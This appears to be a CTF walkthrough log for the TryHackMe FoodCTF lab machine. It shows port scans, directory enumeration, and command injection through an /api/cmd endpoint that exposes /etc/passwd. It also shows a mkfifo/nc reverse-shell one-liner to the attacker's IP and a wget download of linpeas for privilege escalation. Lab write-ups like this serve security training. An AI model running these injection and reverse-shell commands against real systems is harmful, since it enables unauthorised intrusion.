----
Practice Food KoTH alone, to get familiar with KoTH!
---

###  FoodCTF

 Start Machine

This is room for one of the King of the Hill machines, FoodCTF. Capture the food and all the flags, while you're at it.

You can access the official writeup by clicking Options (top right) and then 'Writeups'.

This box was from the April 2020 KoTH rotation. It awards no points, as the current question system doesn't allow me to do this.

Answer the questions below

```
┌──(env-py2)─(witty㉿kali)-[~/buffer_overflow]
└─$ deactivate 

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.241.181 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.241.181:22
Open 10.10.241.181:9999
Open 10.10.241.181:15065
Open 10.10.241.181:16109
Open 10.10.241.181:46969
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 11:11 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:11
Completed NSE at 11:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:11
Completed NSE at 11:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:11
Completed NSE at 11:11, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:11
Completed Parallel DNS resolution of 1 host. at 11:11, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:11
Scanning 10.10.241.181 [5 ports]
Discovered open port 22/tcp on 10.10.241.181
Discovered open port 46969/tcp on 10.10.241.181
Discovered open port 9999/tcp on 10.10.241.181
Discovered open port 15065/tcp on 10.10.241.181
Discovered open port 16109/tcp on 10.10.241.181
Completed Connect Scan at 11:11, 0.21s elapsed (5 total ports)
Initiating Service scan at 11:11
Scanning 5 services on 10.10.241.181
Completed Service scan at 11:13, 94.82s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.241.181.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 8.04s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 1.28s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
Nmap scan report for 10.10.241.181
Host is up, received user-set (0.20s latency).
Scanned at 2023-02-18 11:11:45 EST for 105s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 280c0cd95a7dbee6f43ced1051494d19 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKjhSBkXZSZMWPqxiPKa9BxFKoQC6ZhXkKFa28z6w3yLpDBuzZTKyzkoLBm0n8APmlqu9CxnHyVZEmZYwddFuj4FMuAyYNS4BHFg5xMtnKlJK2OKol6F+DRaV8S98FEz0uFaI5yR5PUUtFrByqF01ppr04/HHVvBQpoZDCUabPZRJiEtOi/a5fhBvYRMGJdlijUiee6AoWf4tOc6RPgzxHi2bkqWKyGqdTf26p22tHk0XgSgzQzSh8ABrODNzm04EZYd9+ZHupIo2/mRJGQlBMoVuCcbQpdQrpP/+ivVFiCM8kytrn5Z3ayu6bEslCsbSjvG5VCtAHe2U+q2bsrZ/l
|   256 17ce033bbb207809ab76c06d8dc4df51 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCe4ipBH4bCimLbh8uzN1ix9+rEVIPbFdICCeNBR/+lndHq94/4Ow0odFFBok3r8lFVaPUSTj8QJNES04lSe/sY=
|   256 078a50b55b4aa76cc8b3a1ca77b90d07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEnPlJ5lhNGmcnRSde/U2Jg6eHjsPIm08Z4fRBrjk2Qf
9999/tcp  open  abyss?  syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 18 Feb 2023 16:11:53 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|     king
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 18 Feb 2023 16:11:52 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|_    king
15065/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Host monitoring
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
16109/tcp open  unknown syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 18 Feb 2023 16:11:52 GMT
|     Content-Type: image/jpeg
|     JFIF
|     #*%%*525EE\xff
|     #*%%*525EE\xff
|     $3br
|     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     Y$?_
|     qR]$Oyk
|_    |$o.
46969/tcp open  telnet  syn-ack Linux telnetd
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9999-TCP:V=7.93%I=7%D=2/18%Time=63F0F8C8%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,78,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,\x2018\x20Feb\x2020
SF:23\x2016:11:52\x20GMT\r\nContent-Length:\x204\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\n\r\nking")%r(HTTPOptions,78,"HTTP/1\.0\x2020
SF:0\x20OK\r\nDate:\x20Sat,\x2018\x20Feb\x202023\x2016:11:52\x20GMT\r\nCon
SF:tent-Length:\x204\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\
SF:r\nking")%r(FourOhFourRequest,78,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sa
SF:t,\x2018\x20Feb\x202023\x2016:11:53\x20GMT\r\nContent-Length:\x204\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nking")%r(GenericLin
SF:es,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(T
SF:LSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port16109-TCP:V=7.93%I=7%D=2/18%Time=63F0F8C8%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2DE8,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sat,
SF:\x2018\x20Feb\x202023\x2016:11:52\x20GMT\r\nContent-Type:\x20image/jpeg
SF:\r\n\r\n\xff\xd8\xff\xe0\0\x10JFIF\0\x01\x01\x01\0H\0H\0\0\xff\xdb\0C\0
SF:\x02\x03\x03\x03\x04\x03\x04\x05\x05\x04\x06\x06\x06\x06\x06\x08\x08\x0
SF:7\x07\x08\x08\r\t\n\t\n\t\r\x13\x0c\x0e\x0c\x0c\x0e\x0c\x13\x11\x14\x11
SF:\x0f\x11\x14\x11\x1e\x18\x15\x15\x18\x1e#\x1d\x1c\x1d#\*%%\*525EE\\\xff
SF:\xdb\0C\x01\x02\x03\x03\x03\x04\x03\x04\x05\x05\x04\x06\x06\x06\x06\x06
SF:\x08\x08\x07\x07\x08\x08\r\t\n\t\n\t\r\x13\x0c\x0e\x0c\x0c\x0e\x0c\x13\
SF:x11\x14\x11\x0f\x11\x14\x11\x1e\x18\x15\x15\x18\x1e#\x1d\x1c\x1d#\*%%\*
SF:525EE\\\xff\xc0\0\x11\x08\x03\x84\x05F\x03\x01\"\0\x02\x11\x01\x03\x11\
SF:x01\xff\xc4\0\x1f\0\0\x01\x05\x01\x01\x01\x01\x01\x01\0\0\0\0\0\0\0\0\x
SF:01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\0\xb5\x10\0\x02\x01\x03\
SF:x03\x02\x04\x03\x05\x05\x04\x04\0\0\x01}\x01\x02\x03\0\x04\x11\x05\x12!
SF:1A\x06\x13Qa\x07\"q\x142\x81\x91\xa1\x08#B\xb1\xc1\x15R\xd1\xf0\$3br\x8
SF:2\t\n\x16\x17\x18\x19\x1a%&'\(\)\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwx
SF:yz\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97\x98\x99\x9a\
SF:xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba
SF:\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xd
SF:a\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf1\xf2\xf3\xf4\xf5\xf6\xf7\x
SF:f8\xf9\xfa\xff\xc4\0\x1f\x01\0\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\
SF:0\0\0\0\0\0\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\0\xb5\x11\0
SF:\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\0\x01\x02w\0\x01\x02\x03\x
SF:11\x04\x05!1\x06\x12AQ\x07aq\x13\"2\x81\x08\x14B\x91\xa1\xb1\xc1\t#3R\x
SF:f0\x15br\xd1\n\x16\$4\xe1%\xf1\x17\x18\x19\x1a&'\(\)\*56789:CDEFGHIJSTU
SF:VWXYZcdefghijstuvwxyz\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x
SF:95\x96\x97\x98\x99\x9a\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\
SF:xb5\xb6\xb7\xb8\xb9\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4
SF:\xd5\xd6\xd7\xd8\xd9\xda\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf2\xf3\xf
SF:4\xf5\xf6\xf7\xf8\xf9\xfa\xff\xda\0\x0c\x03\x01\0\x02\x11\x03\x11\0\?\0
SF:\xfa\x96F\xf3/\x0f\xcd\xc0\xdcp\x7f\*\x97!\x1e\xd4p\x7f\|\x83\xdf\x8c\x
SF:b7\xf4\xa4\xb4\x8e=\x92\xc9\xce\xec\xe2\x90\xc6Zks\x91\x85Y\$\?_\xba\+\
SF:x81\x1e\xa9E\xees31\xe0\x02\xccA\xfe\x20\xa35\x90\x1c\xff\0fC\x95\x1b\x
SF:88\x047L\xe4\xf4\x1f\x9d\^\x92=\xdez\?\xded!~\x8eqR\]\$Oyk\x02\x81\x85\
SF:xc1\xc9\xe8\0\xed\xfaS\x11\|\x05q\x20\xee\xbbT\x0fM\xc6\xa3i\xb2\x97\x9
SF:37\x18\xca\xae:\xd6t\x0e\xdb\xe3\xf4/#\x96\xf4\t\x92\)\xad\xb7\xca\x89\
SF:x03}\xf9@l\xfbsLh\xcb\xba@\xb7d\x86%\x96\xdc\*\xfb\x175\x8b\|\$o\.\xd9N
SF:\xe1\xf2n\xfa\x97\x15\xbdrA\x86G\r\x9c\xce\xaa9\xfe\xe7ZM2\x08");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.20 seconds


http://10.10.241.181:15065/

Site down for maintenance

Blame Dan, he keeps messing with the prod servers.

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.241.181:15065/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.181:15065/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/02/18 11:16:39 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.241.181:15065/monitor              (Status: 301) [Size: 0] [--> monitor/]
Progress: 2703 / 220561 (1.23%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/02/18 11:16:49 Finished
===============================================================

http://10.10.241.181:15065/monitor/

view-source:http://10.10.241.181:15065/monitor/main.js

console.log("Hello, World!")
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'text/plain'
            // 'Content-Type': 'application/x-www-form-urlencoded',
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: data // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
function onLoad() {
    document.getElementById("pingForm").addEventListener("submit", function (event) {
        event.preventDefault()
    });
}
//Steve said I should obfuscate my code to make it better. I don't really understand but it works so meh
const _0x1a9d=['dmFsdWU=','I2hvc3RUb1Bpbmc=','dGVzdA==','SVAgYWRkcmVzcyBpbnZhbGlk','cXVlcnlTZWxlY3Rvcg==','UGluZ2luZzog','dGV4dENvbnRlbnQ='];(function(_0x365cb9,_0x1a9de5){const _0x4d6713=function(_0x1784af){while(--_0x1784af){_0x365cb9['push'](_0x365cb9['shift']());}};_0x4d6713(++_0x1a9de5);}(_0x1a9d,0x148));const _0x4d67=function(_0x365cb9,_0x1a9de5){_0x365cb9=_0x365cb9-0x0;let _0x4d6713=_0x1a9d[_0x365cb9];if(_0x4d67['NLdOOO']===undefined){(function(){let _0x525fb1;try{const _0x3f1d56=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x525fb1=_0x3f1d56();}catch(_0xc71f1){_0x525fb1=window;}const _0x4685a7='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x525fb1['atob']||(_0x525fb1['atob']=function(_0x255321){const _0x24c30f=String(_0x255321)['replace'](/=+$/,'');let _0x5e1a31='';for(let _0x4d6263=0x0,_0x55cd30,_0x4f9f3e,_0x1e913f=0x0;_0x4f9f3e=_0x24c30f['charAt'](_0x1e913f++);~_0x4f9f3e&&(_0x55cd30=_0x4d6263%0x4?_0x55cd30*0x40+_0x4f9f3e:_0x4f9f3e,_0x4d6263++%0x4)?_0x5e1a31+=String['fromCharCode'](0xff&_0x55cd30>>(-0x2*_0x4d6263&0x6)):0x0){_0x4f9f3e=_0x4685a7['indexOf'](_0x4f9f3e);}return _0x5e1a31;});}());_0x4d67['LCDJpm']=function(_0x16dbab){const _0x48165c=atob(_0x16dbab);let _0x25c165=[];for(let _0x2e78af=0x0,_0x1185f3=_0x48165c['length'];_0x2e78af<_0x1185f3;_0x2e78af++){_0x25c165+='%'+('00'+_0x48165c['charCodeAt'](_0x2e78af)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x25c165);};_0x4d67['znaolL']={};_0x4d67['NLdOOO']=!![];}const _0x1784af=_0x4d67['znaolL'][_0x365cb9];if(_0x1784af===undefined){_0x4d6713=_0x4d67['LCDJpm'](_0x4d6713);_0x4d67['znaolL'][_0x365cb9]=_0x4d6713;}else{_0x4d6713=_0x1784af;}return _0x4d6713;};async function pingHost(){const _0x25c165=document[_0x4d67('0x5')]('#outputSection');const _0x2e78af=document[_0x4d67('0x5')](_0x4d67('0x2'));const _0x1185f3=_0x2e78af[_0x4d67('0x1')];if(_0x1185f3!==undefined&&_0x1185f3!==''&&ValidateIPaddress(_0x1185f3)){_0x25c165[_0x4d67('0x0')]=_0x4d67('0x6')+_0x1185f3+'\x0a';const _0x27c227=await postData('/api/cmd','ping\x20-c\x204\x20'+_0x1185f3);_0x25c165['textContent']+=await _0x27c227['text']();}else{_0x25c165[_0x4d67('0x0')]=_0x4d67('0x4');}}function ValidateIPaddress(_0x23b8a0){if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4d67('0x3')](_0x23b8a0)){return!![];}return![];}

Request payload

POST
http://10.10.241.181:15065/api/cmd

ping -c 4 10.8.19.103


┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "ls -lah"
total 7.8M
drwxr-xr-x 6 bread bread 4.0K Apr  6  2020 .
drwxr-xr-x 7 root  root  4.0K Mar 28  2020 ..
-rw------- 1 bread bread    5 Apr  6  2020 .bash_history
-rw-r--r-- 1 bread bread  220 Mar 20  2020 .bash_logout
-rw-r--r-- 1 bread bread 3.7K Mar 20  2020 .bashrc
drwx------ 2 bread bread 4.0K Mar 20  2020 .cache
----r--r-- 1 bread bread   38 Mar 28  2020 flag
drwx------ 3 bread bread 4.0K Mar 20  2020 .gnupg
drwxrwxr-x 3 bread bread 4.0K Mar 20  2020 .local
-rwxrwxr-x 1 bread bread 7.7M Apr  6  2020 main
-rw-rw-r-- 1 bread bread 1.5K Apr  6  2020 main.go
-rw-r--r-- 1 bread bread  825 Mar 28  2020 .profile
drwxrwxr-x 3 bread bread 4.0K Apr  6  2020 resources
                                                                                                                   
┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "cat flag"
ERROR:	exit status 1                                                                                                                   
                                                                                    
┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:thm:/home/tryhackme:/bin/bash
telnetd:x:111:113::/nonexistent:/usr/sbin/nologin
food:x:1001:1001:,,,:/home/food:/bin/bash
mysql:x:112:114:MySQL Server,,,:/nonexistent:/bin/false
pasta:x:1002:1002:,,,:/home/pasta:/bin/bash
ramen:x:1003:1003:,,,:/home/ramen:/bin/bash
bread:x:1004:1004:,,,:/home/bread:/bin/bash
                                                                                                                   
┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "cat /etc/shadow"
ERROR:	exit status 1  


revshell

┌──(witty㉿kali)-[~/bug_hunter]
└─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f"

┌──(witty㉿kali)-[~/bug_hunter]
└─$ rlwrap nc -lvnp 1337                                      
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.241.181] 33944
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bread@foodctf:~$ ls
ls
flag  main  main.go  resources
bread@foodctf:~$ cat flag
cat flag
cat: flag: Permission denied

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.241.181 - - [18/Feb/2023 11:35:08] "GET /linpeas.sh HTTP/1.1" 200 -

bread@foodctf:/tmp$ wget http://10.8.19.103:8000/linpeas.sh
wget http://10.8.19.103:8000/linpeas.sh
--2023-02-18 16:35:07--  http://10.8.19.103:8000/linpeas.sh
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   528KB/s    in 1.5s    

2023-02-18 16:35:09 (528 KB/s) - ‘linpeas.sh’ saved [828098/828098]

bread@foodctf:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
bread@foodctf:/tmp$ ./linpeas.sh

./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
